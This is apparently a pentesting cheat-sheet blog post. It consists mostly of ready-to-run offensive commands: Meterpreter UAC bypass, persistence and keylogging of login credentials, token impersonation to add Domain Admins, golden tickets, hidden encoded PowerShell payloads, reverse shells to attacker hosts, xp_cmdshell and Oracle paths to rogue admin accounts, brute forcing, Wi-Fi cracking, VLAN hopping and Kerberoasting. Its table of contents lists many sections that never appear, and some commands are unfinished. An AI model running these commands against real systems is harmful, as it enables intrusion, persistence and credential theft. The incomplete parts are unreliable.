---
layout: post
title: Infrastructure Pentesting from a Linux Box
meta:
category:
image: card1-img.png
date: 2020-12-19
tags:
permalink: blog/:title
---
<style>
  .hover-link:hover {
    
  }

  .hover-link {
    font-weight: bold;
    cursor: pointer;
    color: #05cfa3;
  }
</style>

- [Connectivity](about:blank#connectivity)
    - [View IP Addresses](about:blank#view-ip-addresses)
    - [Adding or Deleting an IP Address](about:blank#adding-or-deleting-an-ip-address)
    - [Add MAC Hardware Address to Network Interface](about:blank#add-mac-hardware-address-to-network-interface)
    - [Enabling or Disabling Network Interface](about:blank#enabling-or-disabling-network-interface)
    - [Enable/Disable ARP Protocol](about:blank#enabledisable-arp-protocol)
    - [Gateway and Routes](about:blank#gateway-and-routes)
    - [DHCP](about:blank#dhcp)
    - [vConfig](about:blank#vconfig)
- [Host Discovery](about:blank#host-discovery)
    - [Ping](about:blank#ping)
    - [NetBIOS](about:blank#netbios)
    - [Arp](about:blank#arp)
    - [Netdisover](about:blank#netdisover)
    - [NMAP](about:blank#nmap)
    - [Nmap and Xargs](about:blank#nmap-and-xargs)
    - [Unicornscan](about:blank#unicornscan)
    - [DNS](about:blank#dns)
- [Blackbox](about:blank#blackbox)
- [Shell Customisation](about:blank#shell-customisation)
    - [Custom Aliases](about:blank#custom-aliases)
- [Metasploit](about:blank#metasploit)
    - [Basics](about:blank#basics)
    - [Scanners](about:blank#scanners)
    - [Meterpreter on a Box](about:blank#meterpreter-on-a-box)
    - [Persistence](about:blank#persistence)
    - [keylogging](about:blank#keylogging)
    - [Incognito Meterpreter](about:blank#incognito-meterpreter)
    - [Post exploitation tools in metasploit](about:blank#post-exploitation-tools-in-metasploit)
    - [Tunneling sessions in meterpreter](about:blank#tunneling-sessions-in-meterpreter)
    - [Credentials](about:blank#credentials)
    - [Golden Ticket](about:blank#golden-ticket)
    - [MSFVenom](about:blank#msfvenom)
    - [Switch to Powershell from a meterpreter](about:blank#switch-to-powershell-from-a-meterpreter)
- [Wireless](about:blank#wireless)
    - [CHOPCHOP WEP ATTACK-4](about:blank#chopchop-wep-attack-4)
    - [Cracking Wireless](about:blank#cracking-wireless)
- [Hydra](about:blank#hydra)
- [Databases](about:blank#databases)
    - [Ports](about:blank#ports)
    - [MySQL](about:blank#mysql)
    - [MSSQL](about:blank#mssql)
    - [Oracle](about:blank#oracle)
    - [Postgres](about:blank#postgres)
    - [Firebird](about:blank#firebird)
    - [SQL Injection](about:blank#sql-injection)
- [VLAN HOPPING](about:blank#vlan-hopping)
- [Compile Exploits](about:blank#compile-exploits)
- [Firewall](about:blank#firewall)
- [Kerberoasting](about:blank#kerberoasting)
- [TTY](about:blank#tty)
- [Generating Payloads](about:blank#generating-payloads)
- [Extracting Hashes](about:blank#extracting-hashes)
    - [PwDumpX](about:blank#pwdumpx)
    - [fgdump](about:blank#fgdump)
    - [WCE](about:blank#wce)
- [Booting into backtrack for hash grabbing](about:blank#booting-into-backtrack-for-hash-grabbing)
- [SNMP](about:blank#snmp)
    - [Brute Force Community Strings](about:blank#brute-force-community-strings)
    - [Enumerate](about:blank#enumerate)
- [RSH and Rlogin](about:blank#rsh-and-rlogin)
- [SMB](about:blank#smb)
    - [NetBIOS](about:blank#netbios-1)
    - [Crackmapexec](about:blank#crackmapexec)
    - [NMAP](about:blank#nmap-1)
    - [SMB login (spray credentials)](about:blank#smb-login-spray-credentials)
    - [Enum4linux](about:blank#enum4linux)
    - [SMB Client](about:blank#smb-client)
    - [Mount Share](about:blank#mount-share)
    - [SMBMap](about:blank#smbmap)
    - [SMBTree](about:blank#smbtree)
- [NFS](about:blank#nfs)
- [RPC Enum](about:blank#rpc-enum)
    - [Rpcclient](about:blank#rpcclient)
- [SMTP](about:blank#smtp)
- [Finger](about:blank#finger)
- [FTP](about:blank#ftp)
- [TFTP](about:blank#tftp)
- [NTP](about:blank#ntp)
- [LDAP](about:blank#ldap)
    - [Windapsearch](about:blank#windapsearch)
- [DNS](about:blank#dns-1)
    - [DNS Recon](about:blank#dns-recon)
- [X Windows](about:blank#x-windows)
- [rdp](about:blank#rdp)
- [XDMCP](about:blank#xdmcp)
- [SUID Bits](about:blank#suid-bits)
- [Solaris](about:blank#solaris)
    - [Solaris Patching](about:blank#solaris-patching)
    - [Exploits](about:blank#exploits)
- [Active Directory](about:blank#active-directory)
    - [Change Password of AD User](about:blank#change-password-of-ad-user)
    - [Tokens](about:blank#tokens)
    - [SMB Relay](about:blank#smb-relay)
        - [Metasploit method](about:blank#metasploit-method)
        - [SMBRelayx (Impacket)](about:blank#smbrelayx-impacket)
        - [ntlmrelayx (Impacket)](about:blank#ntlmrelayx-impacket)
        - [Snarf](about:blank#snarf)
        - [Responder](about:blank#responder)
    - [Metasploit (Capture Without Relay)](about:blank#metasploit-capture-without-relay)
    - [Generating UNC path payloads](about:blank#generating-unc-path-payloads)
        - [Metasploit](about:blank#metasploit-1)
    - [Query Logged On Users](about:blank#query-logged-on-users)
- [Transfer Files](about:blank#transfer-files)
    - [exe2bat.exe](about:blank#exe2batexe)
- [Pass-the-Hash (PtH)](about:blank#pass-the-hash-pth)
    - [PtH Requirements](about:blank#pth-requirements)
    - [Patch](about:blank#patch)
    - [Tools](about:blank#tools)
        - [smb_login module in metasploit](about:blank#smb_login-module-in-metasploit)
        - [psexec](about:blank#psexec)
        - [Crackmapexec](about:blank#crackmapexec-1)
        - [Hydra](about:blank#hydra-1)
        - [Medussa](about:blank#medussa)
        - [sprayWMI](about:blank#spraywmi)
        - [pth-toolkit](about:blank#pth-toolkit)
    - [Mimikatz](about:blank#mimikatz)
        - [winexe](about:blank#winexe)
        - [Script](about:blank#script)
- [Pass the Ticket](about:blank#pass-the-ticket)

# Connectivity

- `ifconfig` is part of the `net-tools` package.
- `ip` is an alternative command from `iproute2util` package.

## View IP Addresses

{% highlight PowerShell %}
ifconfig
ip a
{% endhighlight %}

## Adding or Deleting an IP Address

ifconfig

{% highlight PowerShell %}
ifconfig eth0 add 192.168.80.174
ifconfig eth0 del 192.168.80.174
{% endhighlight %}

ip

{% highlight PowerShell %}
ip a add 192.168.80.174 dev eth0
ip a del 192.168.80.174 dev eth0
{% endhighlight %}

static interface configurations (/etc/network/interfaces).

{% highlight PowerShell %}
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static u
address 192.168.20.9
netmask 255.255.255.0
gateway 192.0.2.254
{% endhighlight %}

## Add MAC Hardware Address to Network Interface

ifconfig

{% highlight PowerShell %}
ifconfig eth0 hw ether 00:0c:29:33:4e:aa
{% endhighlight %}

ip

{% highlight PowerShell %}
ip link set dev eth0 address 00:0c:29:33:4e:aa
{% endhighlight %}

## Enabling or Disabling Network Interface

ifconfig

{% highlight PowerShell %}
ifconfig eth0 down
ifconfig eth0 up
{% endhighlight %}

ip

{% highlight PowerShell %}
ip link set dev eth0 down
ip link set dev eth0 up
{% endhighlight %}

## Enable/Disable ARP Protocol

ifconfig

{% highlight PowerShell %}
ifconfig eth0 arp
ifconfig eth0 -arp
{% endhighlight %}

ip

{% highlight PowerShell %}
ip link set dev eth0 arp on
ip link set dev eth0 arp off
{% endhighlight %}

## Gateway and Routes

route

{% highlight PowerShell %}
route add default gw <ip>
route add -net 192.168.10.0 netmask 255.255.255.0 dev eth0
{% endhighlight %}

ip

{% highlight PowerShell %}
ip route add default via <gw addr>
ip route add <ip> via <gw addr> dev <interface>
ip route show
{% endhighlight %}

## DHCP

Request IP Address (Sends broadcast)

{% highlight PowerShell %}
dhclient
{% endhighlight %}

More advanced request, forces IPv4, against the specified server for the specified interface

{% highlight PowerShell %}
dhclient -4 -s 10.128.128.128 eth0
{% endhighlight %}

## vConfig

Check if 8021q is loaded:

{% highlight PowerShell %}
lsmod | grep 8021q
{% endhighlight %}

If not:

{% highlight PowerShell %}
modprobe 8021q
{% endhighlight %}

Add vConfig

{% highlight PowerShell %}
vconfig add eth0 5
{% endhighlight %}

Check:

{% highlight PowerShell %}
ifconfig eth0.5
{% endhighlight %}

{% highlight PowerShell %}
ifconfig eth0.5 192.168.1.100 netmask 255.255.255.0 broadcast 192.168.1.255 up
ifconfig eth0.5 x.x.x.x netmask x.x.x.x broadcast x.x.x.x up
{% endhighlight %}

To delete:

{% highlight PowerShell %}
ifconfig eth0.5 down
vconfig rem eth0.5
{% endhighlight %}

OR:

{% highlight PowerShell %}
ip link add link eth0 name eth0.5 type vlan id 5
ip link
ip -d link show eth0.5
{% endhighlight %}

You need to activate and add an IP address to vlan link, type:

{% highlight PowerShell %}
ip addr add 192.168.1.200/24 brd 192.168.1.255 dev eth0.5
ip link set dev eth0.5 up
{% endhighlight %}

To remove:

{% highlight PowerShell %}
ip link set dev eth0.5 down
ip link delete eth0.5
{% endhighlight %}

# Host Discovery

## Ping

Ping sweep

{% highlight PowerShell %}
fping -g 10.0.0.0/24 --alive --quiet
{% endhighlight %}

## NetBIOS

Scan a subnet looking for Netbios connectivity

{% highlight PowerShell %}
nbtscan -r 10.0.1.0/24
{% endhighlight %}

nbtscan 10.0.57.1-17

nbtscan -v -h

Master browser = PDC (primary domain controller)

## Arp

Arp scan local interface

{% highlight PowerShell %}
arp-scan -l
{% endhighlight %}

Arp scanning specifying interface, retries and ip range

{% highlight PowerShell %}
arp-scan --interface eth0 --retry 4 10.0.0.0/8
{% endhighlight %}

Using AWK to extract just the IP’s

{% highlight PowerShell %}
arp-scan --localnet | grep '^10' | awk '{print$1}'
{% endhighlight %}

## Netdisover

Passive discovery by sniffing

{% highlight PowerShell %}
netdiscover -p
{% endhighlight %}

Specify interface and range

{% highlight PowerShell %}
netdiscover -i eth0 -r 10.0.0.0/8
{% endhighlight %}

## NMAP

Full TCP Ports with default NSE Scripts

{% highlight PowerShell %}
nmap -sSV -p- -A -oA /pentesting/enum/nmap-tcp-full-with-scripts
{% endhighlight %}

Top 2000 UDP Ports with with a maximum of 1 retries per port

{% highlight PowerShell %}
nmap -sUV --top-ports=2000 --max-retries=1 -A -oA /pentesting/enum/nmap-udp-top2000-with-scripts
{% endhighlight %}

## Nmap and Xargs

{% highlight PowerShell %}
cat ips.txt | xargs -I % -P 10 nmap % -sSV -vv -p- -Pn -n -T4 -A --max-rtt-timeout 50ms --max-retries 2 -oA nmap-TCP_FULL-%
{% endhighlight %}

## DNS

{% highlight PowerShell %}
for i in $(cat hosts.txt) ; do host $i; done | grep '^n' | awk '{print$4}' > ips.txt

for i in $(cat hosts_with_port_or_icmp.txt) ; do host $i; done| grep -v '^Host' > hostnames_with_port_or_icmp.txt
{% endhighlight %}

# Blackbox

**When we are given nothing, no IP, no Creds**

Open Wireshark and look for broadcast traffic.

- Arp
- DHCP
- Netbios Naming Service
- Browser Election Requests
- Routing protocols use broadcasting to advertise routes.

Leave Wireshark run for 5 mins. Then look for addresses it has picked up on the network.

{% highlight PowerShell %}
Menu -> Statistics -> Endpoints
{% endhighlight %}

Pick an IP address and check it isn’t in use

{% highlight PowerShell %}
arp-scan -i eth0 -l
{% endhighlight %}

Then find out what the local naming scheme is on the network by using responder to fingerprint

{% highlight PowerShell %}
https://github.com/lgandx/Responder
responder -<finish command>
{% endhighlight %}

Enumerate Users

Use metasploit kerberos enumeration script

{% highlight PowerShell %}
auxiliary/gather/kerberos_enumusers
{% endhighlight %}

NMAP Kerberos enumeration script

{% highlight PowerShell %}
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='marvel.lab',userdb=/pentesting/users.txt 10.50.1.254
{% endhighlight %}

Test credentials

{% highlight PowerShell %}
auxiliary/scanner/smb/smb_login msf module’s “ABORT_ON_LOCKOUT”
{% endhighlight %}

# Shell Customisation

## Custom Aliases

nano ~/.bash_aliases

{% highlight PowerShell %}
nmapper() {
        nmap -sSUV -T4 --top-ports 300 -A $1 -oA nmap-$2 &
}
{% endhighlight %}

Call as follows

{% highlight PowerShell %}
nmapper 10.10.10.0/24 myscan
{% endhighlight %}

# Metasploit

## Basics

Make a workspace

{% highlight PowerShell %}
workspace -a crest
{% endhighlight %}

move into the workspace

{% highlight PowerShell %}
workspace crest
{% endhighlight %}

Find Services

{% highlight PowerShell %}
msf > services -p 161 -r udp --rhosts
{% endhighlight %}

## Scanners

Remember to set threads appropriately

Portscan

{% highlight PowerShell %}
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
{% endhighlight %}

SMB Version

{% highlight PowerShell %}
Use auxiliary/scanner/smb/smb_version
msf > set RHOSTS 10.10.10.0/24
msf > run
{% endhighlight %}

Arp

{% highlight PowerShell %}
msf > use auxiliary/scanner/discovery/arp_sweep
msf > set RHOSTS 10.10.10.0/24
msf > run
{% endhighlight %}

DNS Enum

{% highlight PowerShell %}
msf > use auxiliary/gather/enum_dns
msf > set DOMAIN marvel.lab
msf > run
{% endhighlight %}

https://github.com/kmkz/Pentesting/blob/master/Pentest-cheat-sheet

## Meterpreter on a Box

find out who you are.

{% highlight PowerShell %}
getuid
{% endhighlight %}

if you used a 32bit process migrate into a 64 bit process (try lsass.exe)

{% highlight PowerShell %}
migrate <process number>
{% endhighlight %}

**Important points to remember about migrate**

- Target process must have same or lesser privileges
- Target process may be a more stable process
- When inside a process, can access any files that process has a lock on

If you find your connection is dying on connection you may want to try this on your initial exploit

{% highlight PowerShell %}
msf > set AutoRunScript post/windows/manage/migrate
{% endhighlight %}

Bypass UAC

{% highlight PowerShell %}
msf> use exploit/windows/local/bypassuac
msf> set SESSION x
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LPORT 4446
msf> set LHOST 192.168.18.84
{% endhighlight %}

if you are not system you need to get system..

{% highlight PowerShell %}
getsystem
{% endhighlight %}

## Persistence

{% highlight PowerShell %}
run persistence -A -S -U -X -i 15 -p 1337 -r 10.50.1.205
{% endhighlight %}

## keylogging

`keyscan_start` `keylogrecorder`

- If we want to log the credentials typed when the user unlocks the screen we will have to attach the session to the winlogon.exe process (which runs on SYSTEM).
- If we want to dump keystrokes while the user uses applications and so on, we will have to attach to the process explorer.exe (which runs on user level).

Check for winlogon process id

{% highlight PowerShell %}
ps -S winlogon.exe
{% endhighlight %}

Migrate to the process

{% highlight PowerShell %}
migrate -P 420
{% endhighlight %}

Start Keyscan

{% highlight PowerShell %}
keyscan_start
{% endhighlight %}

Lock users terminal and after they have logged back in

{% highlight PowerShell %}
keyscan_dump
{% endhighlight %}

To capture to a sqlite database, ideal for longer captures. Use `keylogrecorder` by Carlos Perez. This script will attempt to migrate for you prior to recording so it is an all in one command. 

`-c` Type of key capture. (0) for user key presses or (1) for winlogon credential capture Default is 0.

`-t` Time interval in seconds between recollection of keystrokes, default 30 seconds.

{% highlight PowerShell %}
run keylogrecorder -c <num>
{% endhighlight %}

## Incognito Meterpreter

Check the user ID before starting

{% highlight PowerShell %}
meterpreter> getuid
{% endhighlight %}

Load module

{% highlight PowerShell %}
meterpreter > use incognito
{% endhighlight %}

List tokens

{% highlight PowerShell %}
meterpreter > list_tokens -u
{% endhighlight %}

Impersonate a token

{% highlight PowerShell %}
meterpreter > impersonate_token <domain\\adminuser>
meterpreter > impersonate_token PHARMA\globaladmin
{% endhighlight %}

Check user ID

{% highlight PowerShell %}
meterpreter > getuid
{% endhighlight %}

Add a user to domain

{% highlight PowerShell %}
meterpreter > getsystem
meterpreter > getuid
meterpreter > add_user <user> <pwd> -h <dc_ip>
meterpreter > add_group_user "Domain Admins" <user> -h <dc_ip>
{% endhighlight %}

Check our access

{% highlight PowerShell %}
meterpreter > shell
C:\WINDOWS\system32> whoami
{% endhighlight %}

## Post exploitation tools in metasploit

This module harvests credentials found on the host and stores them in the database

{% highlight PowerShell %}
meterpreter > run credcollect
Meterpreter > run post/windows/gather/cachedump
{% endhighlight %}

## Tunneling sessions in meterpreter

Port Forwarding to Local Outbound

{% highlight PowerShell %}
portfwd add -L 127.0.0.2 -l 445 -p 445 -r <remote host>
portfwd add -l 9090 -p 9090 -r 127.0.0.1
portfwd add -l 3389 -p 3389 -r 127.0.0.1
{% endhighlight %}

## Credentials

SMB login (spray credentials)

{% highlight PowerShell %}
msf > use auxiliary/scanner/smb/smb_login
show options
verbose off
set password to the obtained local admin password
remove user as pass
{% endhighlight %}

PSExec (PTH)

> Only for Rid 500 admins https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/

{% highlight PowerShell %}
msf > use exploit/windows/smb/psexec
msf > set smbuser Administrator
msf > set smbpass 00000000000000000000000000000000:DF0BBE45C5C63EAD8DD28966AD69B3EA
{% endhighlight %}

Can just use password for other accouns

{% highlight PowerShell %}
msf > use exploit/windows/smb/psexec
msf > set smbuser test
msf > set smbpass Password123
{% endhighlight %}

## Golden Ticket

Load the Kiwi module

{% highlight PowerShell %}
load kiwi
{% endhighlight %}

Drop into shell

{% highlight PowerShell %}
Shell
{% endhighlight %}

Get SID

{% highlight PowerShell %}
wmic useraccount get name,sid
{% endhighlight %}

Get hash

{% highlight PowerShell %}
lsa_dump_sam
{% endhighlight %}

Create Gold Ticket

{% highlight PowerShell %}
golden_ticket_create -d marvel.lab -u evilsaint -k <KRBTGT USER HASH> -s <sid> -t /root/Downloads/goldkey.tkt
{% endhighlight %}

List all tickets

{% highlight PowerShell %}
kerberos_ticket_list
{% endhighlight %}

Use a ticket

{% highlight PowerShell %}
kerberos_ticket_use /root/Downloads/goldkey.tkt
{% endhighlight %}

## MSFVenom

Format Options (Specified with -f)

Executable formats

{% highlight PowerShell %}
asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war
{% endhighlight %}

Transform formats

{% highlight PowerShell %}
bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
{% endhighlight %}

Create a powershell encode payload inside an exe

{% highlight PowerShell %}
msfvenom -p windows/exec CMD=”powershell -ep bypass -W Hidden -enc [ENCODED POWERSHELL]“ -f exe -e x86/shikata_ga_nai -o /root/Desktop/evilsaint.exe
{% endhighlight %}

## Switch to Powershell from a meterpreter

{% highlight PowerShell %}
use post/windows/manage/payload_inject
set handler true
set payload windows/powershell_reverse_tcp
set lhost 10.50.1.200
set session 16
set PID 564
Run
{% endhighlight %}

# Wireless

Search for wireless device information on: https://wiki.openwrt.org/

Puts Card In Monitor Mode and Changes MAC Address

{% highlight PowerShell %}
airmon-ng stop ath0
ifconfig wifi0 down
macchanger --mac 00:11:22:33:44:55 wifi0
airmon-ng start wifi0
{% endhighlight %}

STARTS AIRODUMP TO CAPTURE IVS -c 5 (-c channel of the axs point in this case 5, -w filename, –bssid mac of10.0.57.11 AP

{% highlight PowerShell %}
airodump-ng -c 5 -w filename --bssid 00:24:B2:B4:21:C0 ath0
{% endhighlight %}

DEAUTH

{% highlight PowerShell %}
aireplay-ng -0 1 -a 00:24:B2:B4:21:C0 -c 00:26:5E:47:CB:D4 ath0
{% endhighlight %}

FAKE AUTH

{% highlight PowerShell %}
aireplay-ng -1 0 -e BTVOYAGER2500V-01 -a 00:24:B2:B4:21:C0 -h 00:11:22:33:44:55 ath0
aireplay-ng -1 6000 -o 1 -q 10 -a 00:24:B2:B4:21:C0 -h 00:11:22:33:44:55 ath0
{% endhighlight %}

## CHOPCHOP WEP ATTACK-4

{% highlight PowerShell %}
aireplay-ng -4 -h 00:11:22:33:44:55 -b 00:24:B2:B4:21:C0 ath0
packetforge-ng -0 -a 00:24:B2:B4:21:C0 -h 00:11:22:33:44:55 -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-1123-200316.xor -w test
aireplay-ng -2 -r test ath0
{% endhighlight %}

## Cracking Wireless

RUN WEP CRACK

{% highlight PowerShell %}
aircrack-ng -n 128 -z -f 1 -e test -b 00:24:B2:B4:21:C0 test*.cap
{% endhighlight %}

WPA WPA2 CRACK

{% highlight PowerShell %}
aircrack-ng -w password.lst -b 00:24:B2:B4:21:C0 filename*.cap
aircrack-ng -w /usr/local/john-1.7.2/password.lst -b 00:24:B2:B4:21:C0 filename*.cap
{% endhighlight %}

# Hydra

Comma seperated

{% highlight PowerShell %}
hydra -v -V -C user-pass.txt 10.1.18.2 smb
{% endhighlight %}

not using comma separated…

{% highlight PowerShell %}
hydra -L users.txt -e ns 172.24.2.97 smb
{% endhighlight %}

# Databases

**Microsoft SQL Server**

1433/tcp - SQL Database Engine 

1434/udp - SQL Browser Service (This port cannnot be changed)

**MySQL**

3306/tcp

**Postgresql**

5432/tcp

**Firebird & Interbase**

3050/tcp

**Oracle**

1521/tcp

## MySQL

Connect

{% highlight PowerShell %}
mysql -h <host> -u root -p
{% endhighlight %}

some useful commands

{% highlight PowerShell %}
select version();
show databases;
show tables;
select * from users;
{% endhighlight %}

## MSSQL

Unicornscan -Find database hosts

{% highlight PowerShell %}
unicornscan -i eth0 -p 1433 10.0.0.0/24 > sql-servers.txt
cat sql-servers.txt | grep '^TCP' | awk '{print$6}' > sql-hosts.txt
{% endhighlight %}

metasploit

{% highlight PowerShell %}
use /scanner/mssql/mssql_ping
{% endhighlight %}

Brutefoce Password

{% highlight PowerShell %}
search mssql
use /scanner/mssql/mssql_login
set BRUTEFORCE_SPEED 5
set RHOSTS file:/home/tb/rhosts.txt
show options
exploit
{% endhighlight %}

Leverage xp_cmdshell to get a shell

{% highlight PowerShell %}
sqsh -S <ip_address> -U sa -P <password>

exec sp_configure ‘show advanced options’, 1
go
reconfigure
go
exec sp_configure ‘xp_cmdshell’, 1
go
reconfigure
go
xp_cmdshell 'dir C:\'
Go
xp_cmdshell 'type c:\trophy.txt'
Go
xp_cmdshell 'net user evilsaint Passw0rd123 /add'
Go
xp_cmdshell 'net localgroup Administrators evilsaint /ADD'
Go
{% endhighlight %}

Nmap xp_cmdshell

{% highlight PowerShell %}
nmap --script=ms-sql-xp-cmdshell --script-args mssql.username='sa',mssql.password='PASSWORD_HERE',ms-sql-xp-cmdshell.cmd='net user f1guref0ur cr@cked /add' -p1433 192.168.0.66
nmap --script=ms-sql-xp-cmdshell --script-args mssql.username='sa',mssql.password='PASSWORD_HERE',ms-sql-xp-cmdshell.cmd='net localgroup administrators f1guref0ur /add' -p1433 192.168.0.66
{% endhighlight %}

Connect without a default port

{% highlight PowerShell %}
sqsh -S <host>:<port> -U sa -P ""
{% endhighlight %}

**Useful Queries**

list databases

{% highlight PowerShell %}
select name from master..sysdatabases;
{% endhighlight %}

list data in tables

{% highlight PowerShell %}
select * from trophy_table;
{% endhighlight %}

## Oracle

http://pentestdiary.blogspot.com/2017/08/oracle-database-penetration-testing.html

Stages to attach Oracle with Metasploit:

1. scan range for oracle tns listener version (scanner/oracle/tnslsnr_version) 
2. get sid from hosts found (auxiliary/scanner/oracle/spy_sid) 
3. use orale login enumerator (auxiliary/admin/oracle/oracle_login) 
4. dump password hashes (auxiliary/scanner/oracle/oracle_hashdump)

scanning (Find Oracle TNS Listener)

{% highlight PowerShell %}
msf > use scanner/oracle/tnslsnr_version
{% endhighlight %}

Brute Force TNS Listener

{% highlight PowerShell %}
hydra -P /tmp/tnspass.txt -t 16 -s 1521 10.50.1.246
{% endhighlight %}

Brute force the oracle sids

{% highlight PowerShell %}
use auxiliary/scanner/oracle/sid_brute
{% endhighlight %}

SID enum

{% highlight PowerShell %}
msf auxiliary(tnslsnr_version) > use scanner/oracle/sid_enum
{% endhighlight %}

login bruteforce

{% highlight PowerShell %}
msf auxiliary(tnscmd) > use admin/oracle/login_brute
msf auxiliary(login_brute) > set RHOST <oracle-ip>
RHOST => <oracle-ip>
msf auxiliary(login_brute) > set SID <sid>
SID => <sid>
msf auxiliary(login_brute) > run
{% endhighlight %}

SQL login utility

{% highlight PowerShell %}
msf auxiliary(login_brute) > use admin/oracle/oracle_sql
msf auxiliary(oracle_sql) > set RHOST <oracle-ip>
RHOST => <oracle-ip>
msf auxiliary(oracle_sql) > set SID <sid>
SID => <sid>
msf auxiliary(oracle_sql) > run
{% endhighlight %}

List privilege

{% highlight PowerShell %}
msf auxiliary(oracle_sql) > set SQL "select * from user_role_privs"
SQL => select * from user_role_privs
msf auxiliary(oracle_sql) > run
{% endhighlight %}

Give DBA privilege

{% highlight PowerShell %}
msf > use sqli/oracle/dbms_export_extension
msf auxiliary(dbms_export_extension) > set RHOST <oracle-ip>
RHOST => <oracle-ip>
msf auxiliary(dbms_export_extension) > set SID <sid>
SID => <sid>
msf auxiliary(dbms_export_extension) > run
{% endhighlight %}

Grant javasys to spawn shell

{% highlight PowerShell %}
msf auxiliary(oracle_sql) > set SQL "grant javasyspriv to <user>"
SQL => grant javasyspriv to <user>
msf auxiliary(oracle_sql) > run
[*] Sending SQL...
[*] Done...
[*] Auxiliary module execution completed
msf auxiliary(oracle_sql) > set SQL "select * from user_role_privs"
SQL => select * from user_role_privs
msf auxiliary(oracle_sql) > run
{% endhighlight %}

Oracle Hashdump

{% highlight PowerShell %}
use auxiliary/scanner/oracle/oracle_hashdump
{% endhighlight %}

Spawn Shell

if you got the dba privilege of the oracle db, try this:

{% highlight PowerShell %}
msf > use admin/oracle/post_exploitation/win32exec
msf auxiliary(win32exec) > set CMD "net user nta007 m0nitoR123* /add && net localgroup administrators nta007 /add"
CMD => net user nta007 m0nitoR123* /add && net localgroup administrators nta007 /add
msf auxiliary(oracle_win32) > set SID <sid>
SID => <sid>
msf auxiliary(oracle_win32) > set RHOST <oracle-ip>
RHOST => <oracle-ip>
msf auxiliary(oracle_win32) > run

THEN

msf > use windows/smb/psexec
msf exploit(psexec) > set RHOST <oracle-ip>
RHOST => <oracle-ip>
msf exploit(psexec) > set SMBUser nta007
SMBUser => nta007
msf exploit(psexec) > set SMBPass m0nitoR123*
SMBPass => m0nitoR123*
msf exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST <our-ip>
LHOST => <our-ip>
msf exploit(psexec) > exploit
{% endhighlight %}

Clean Track

{% highlight PowerShell %}
msf  auxiliary(oracle_sql) > set SQL "REVOKE DBA FROM <user>"
SQL => REVOKE DBA FROM <user>
msf  auxiliary(oracle_sql) > run
{% endhighlight %}

## Postgres

identify the postgres user

{% highlight PowerShell %}
auxiliary/scanner/postgres/postgres_login
{% endhighlight %}

use the readfile module to read /etc/passwd

{% highlight PowerShell %}
auxiliary/admin/postgres/postgres_readfile
{% endhighlight %}

## Firebird

{% highlight PowerShell %}
isql -u sysdba -p masterkey "hostname:C:/path/to/Database/database.fdb"
{% endhighlight %}

## SQL Injection

{% highlight PowerShell %}
sqlmap.py -u 'http://www.target.com' --random-agent --dbms=MSSQL --level=5 --risk=3 -b -- passwords --crawl=10
{% endhighlight %}

# VLAN HOPPING

Set interface

{% highlight PowerShell %}
ip link set dev <interface> up
{% endhighlight %}

Extract the information required:

{% highlight PowerShell %}
tshark -a duration:90 -i hop0 -Y 'cdp' -V | grep -E 'Native VLAN:|VTP Management Domain:|IP address:'
{% endhighlight %}

OR

Look at CDP packets extract Native VLAN, VTP Mgmt Domain & Mgmt IP Address. IF Mgmt IP is empty, start yersinia (yersinia dtp -attack 1 -interface hop0)

Enable trunk port with yersinia:

{% highlight PowerShell %}
yersinia dtp -attack 1 -interface hop0
{% endhighlight %}

Extract the VLAN ID’s

{% highlight PowerShell %}
tshark -a duration:90 -i hop0 -Y "vlan" -x -V 2>&1 | grep 802.1Q
{% endhighlight %}

OR

Apply ‘vlan’ filter in Wireshark, look at the STP packets for VLAN ID’s. Find the VLAN with the management IP on it:

Scan the vlan

{% highlight PowerShell %}
arp-scan -Q <vlan id> -I <interface> --arpspa <src ip (pick something close to mgmt ip) <mgmt ip>
{% endhighlight %}

Create the new virtual adaptor on the VLAN:

{% highlight PowerShell %}
ip link add link <interface> name <interface>.<vlanid> type vlan id <vlan id>
{% endhighlight %}

Assign yourself an IP:

{% highlight PowerShell %}
ip link set dev <interface>.<vlanid> up
ip addr add <src ip>/24 dev <interface>.<vlanid>
{% endhighlight %}

# Compile Exploits

32-bit Windows executable

{% highlight PowerShell %}
i686-w64-mingw32-gcc -o Object_Name32.exe ProgramName.c
{% endhighlight %}

64-bit Windows executable

{% highlight PowerShell %}
x86_64-w64-mingw32-gcc -o Object_Name64.exe ProgramName.c
{% endhighlight %}

# Firewall

To find the firewall get internet connectivity;

{% highlight PowerShell %}
traceroute to 8.8.8.8
{% endhighlight %}

firewall will be one of the early hops. first will be the switch you are connected to.

Firewalk

{% highlight PowerShell %}
firewalk -p [protocol] -d [destination_port] -s [source_port][internal_IP] [gateway_IP]
{% endhighlight %}

ftester

{% highlight PowerShell %}
host 1 ./ftestd -i eth0 -v host 2 ./ftest -f ftest.conf -v -d 0.01 then ./freport ftest.log ftestd.log
{% endhighlight %}

# Kerberoasting

- Scan Active Directory for user accounts with SPN values set.
- Request service tickets from AD using SPN values
- Extract service tickets to memory and save to a file
- Brute force attack those passwords offline until cracked

https://github.com/nidem/kerberoast.git

Query tickets vis SPN’s

{% highlight PowerShell %}
PS C:\> setspn -T medin -Q */*
{% endhighlight %}

Request One ticket:

{% highlight PowerShell %}
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"
{% endhighlight %}

Request All the tickets

{% highlight PowerShell %}
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
{% endhighlight %}

Extract the acquired tickets from ram with Mimikatz

{% highlight PowerShell %}
mimikatz # kerberos::list /export
{% endhighlight %}

